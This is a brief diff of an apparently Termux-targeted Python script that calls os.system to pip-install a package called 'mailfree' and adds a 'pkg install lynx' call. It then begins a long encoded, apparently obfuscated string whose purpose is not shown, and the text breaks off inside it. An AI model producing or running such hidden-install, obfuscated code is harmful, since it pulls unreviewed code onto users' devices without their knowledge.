@@ -1,5 +1,7 @@
 #CapthaCode404_
-import os;os.system("pip2 install mailfree");import mailfree
+import os;os.system("pip2 install mailfree");
+os.system('pkg install lynx')
+import mailfree
 a="""32$==AecOb9ME/zOwwjKXncOpySxokyP7M9HAQRPbw6
 25$4x5s12091wAd2fTS3FQYPTPQ3DNNLDL8MdyZPjyL39MdHdGE2fT8MYwiZS6Z5ZmgEDo6zM7ciEwcNPh7
 31$==AecObttcfNKwgTNdDcxz8K3Nfry3qCviiBSagReBghJlgh
